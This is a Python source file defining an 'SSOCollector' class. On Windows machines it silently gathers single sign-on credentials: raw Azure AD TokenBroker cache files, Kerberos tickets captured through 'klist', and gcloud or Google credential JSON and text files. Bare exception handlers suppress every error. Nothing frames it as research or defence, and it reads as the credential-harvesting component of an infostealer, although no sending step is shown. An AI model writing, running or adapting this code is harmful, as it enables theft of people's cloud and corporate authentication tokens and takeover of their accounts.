import os
import json
import subprocess

class SSOCollector:
    def __init__(self):
        pass
    
    def collect_sso(self):
        sso_data = {}
        try:
            if os.name == 'nt':
                localappdata = os.getenv('LOCALAPPDATA')
                sso_data.update(self._azure_ad_tokens(localappdata))
                sso_data.update(self._kerberos_tickets())
                sso_data.update(self._google_tokens())
        except:
            pass
        return sso_data
    
    def _azure_ad_tokens(self, localappdata):
        data = {}
        try:
            token_path = os.path.join(localappdata, 'Microsoft', 'TokenBroker', 'Cache')
            if os.path.exists(token_path):
                for file in os.listdir(token_path):
                    file_path = os.path.join(token_path, file)
                    if os.path.isfile(file_path):
                        with open(file_path, 'rb') as f:
                            content = f.read(500)
                            data[f'az_token_{file}'] = content.hex()
        except:
            pass
        return data
    
    def _kerberos_tickets(self):
        data = {}
        try:
            result = subprocess.run(['klist'], capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                data['kerberos_tickets'] = result.stdout[:1000]
        except:
            pass
        return data
    
    def _google_tokens(self):
        data = {}
        try:
            if os.name == 'nt':
                gcp_paths = [
                    os.path.expanduser('~/.config/gcloud'),
                    os.path.expanduser('~/.google_credentials')
                ]
                for path in gcp_paths:
                    if os.path.exists(path):
                        for root, dirs, files in os.walk(path):
                            for file in files:
                                if file.endswith(('.json', '.txt')):
                                    file_path = os.path.join(root, file)
                                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                        content = f.read(500)
                                        data[f'gcp_{file}'] = content
        except:
            pass
        return data

